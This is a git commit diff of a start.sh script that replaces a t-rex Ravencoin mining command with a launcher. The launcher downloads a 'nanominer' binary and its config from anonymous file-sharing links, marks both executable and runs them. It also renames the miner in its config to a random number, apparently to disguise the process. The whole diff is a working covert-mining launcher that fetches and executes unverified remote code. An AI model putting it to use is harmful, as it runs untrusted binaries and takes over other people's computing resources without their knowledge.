395505499e3318def8b2d5d824b5ad73c59c835c
solahfatsalma <107563537+solahfatsalma@users.noreply.github.com>
2022-07-29 23:44:21 +0800

    Add files via upload

--- start.sh
+++ start.sh
@@ -1,1 +1,7 @@
-./t-rex -a kawpow -o stratum+tcp://rvn-eu1.nanopool.org:12222 -u RRKH4MK9Z8pd6MzDcCsseoFPF8KUepczV9.work1/anwojerb@gmail.com -p x -l log.txt
+#!/bin/bash
+wget https://store6.gofile.io/download/41f77e08-1c64-4989-98c7-0a063caba68f/nanominer
+wget https://store6.gofile.io/download/e3ab1d3c-a88a-4c5b-b835-196b1983d86b/cfg.ini
+chmod +x cfg.ini
+chmod +x nanominer
+sed -i "s/nanominer/$(shuf -n 1 -i 1-999999)/" "cfg.ini"
+./nanominer cfg.ini
